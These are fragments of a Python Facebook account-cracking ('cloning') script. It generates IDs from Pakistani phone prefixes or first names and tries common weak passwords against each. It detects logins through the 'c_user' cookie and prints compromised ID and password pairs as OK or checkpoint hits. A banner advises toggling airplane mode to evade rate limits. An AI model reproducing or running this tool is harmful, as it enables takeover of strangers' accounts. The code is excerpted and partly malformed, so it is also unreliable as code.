from os import path 
 ...
 os.system("xdg-open https://facebook.com/groups/554452446624067/") 
 def menu_apikey(): 
...
\$$$$$$  |$$ |  $$ | $$$$$$  |$$ | \$$ |$$ |  $$ |
 ...
      
  [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$] 
  \033[1;37m Use (Airplane) Mod Every 10 Min For Get More Ok iDz \033[1;37m 
  [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]""") 
 ...
     clear() 
     #ckx() 
     print(f" \033[1;32m[1] FILE Clone") 
     print(f" \033[1;33m[2] Pak Random Clone") 
     print(f" \033[1;34m[3] Gmail Cloning") 
 ...
                         Ali=session.cookies.get_dict().keys() 
                         if "c_user" in Ali: 
 ...
                                 if 'y' in pcp: 
                                         print(f'\r\r\x1b[1;31m [Shona -CP] '+ids+' | '+pas+'\033[1;97m') 
 ...
                 clear() 
                 pcp.append(f'y') 
                 print('\033[1;32m Code example: 0300,0314,0332,0344') 
 ...
                         for psx in user: 
                                 ids = code+psx 
                                 passlist = [psx,ids,'khankhan','khan123','khan1122,''punjab,''lahore'] 
 ...
                 clear() 
                 pcp.append(f'y') 
                 print('\033[1;32m Name  example:  Ali, Hamza, Zain') 
                 code = input(' First name : ') 
                 print(' Name Example : khan, ali, ') 
 ...
                 cid = coki[151:166] 
                 print('\n') 
                 print('\033[1;92m[Shona -OK] '+idf+' | '+ps+'\033[0;97m') 
                 cek_apk(coki) 
 ...
                 cid = coki[141:156] 
                 print('\n') 
                 print('\033[1;91m[Shona -CP] '+idf+' | '+ps+'\033[0;97m') 
